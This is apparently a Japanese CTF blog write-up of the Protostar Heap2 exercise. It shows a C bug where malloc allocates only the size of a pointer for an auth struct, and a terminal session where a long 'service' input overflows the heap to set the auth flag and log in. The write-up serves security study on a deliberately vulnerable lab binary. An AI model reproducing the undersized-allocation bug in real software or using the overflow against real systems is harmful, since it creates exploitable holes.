---
layout: post
redirect_from:
  - /blog/2016/01/23/exploit-exercises-protostar-heap2/
date: 2016-01-23T14:36:33+09:00
tags: [ "ctf", "writeup", "exploit-exercises", "heap" ]
---

# Exploit Exercises Protostar Heap2

0,1と比較して簡単。

## [Protostar Heap2](https://exploit-exercises.com/protostar/heap2/)

``` c
struct auth {
    char name[32];
    int auth;
};

struct auth *auth;
```

に対して、

``` c
auth = malloc(sizeof(auth));
```

としてしまっている。つまり`sizeof(struct auth)`でなく`sizeof(struct auth *)`になっている。

`auth->auth`を真にするだけでよいので簡単。

``` sh
$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x8973008, service = (nil) ]
login
please enter your password
[ auth = 0x8973008, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x8973008, service = 0x8973018 ]
login
you have logged in already!
[ auth = 0x8973008, service = 0x8973018 ]
```
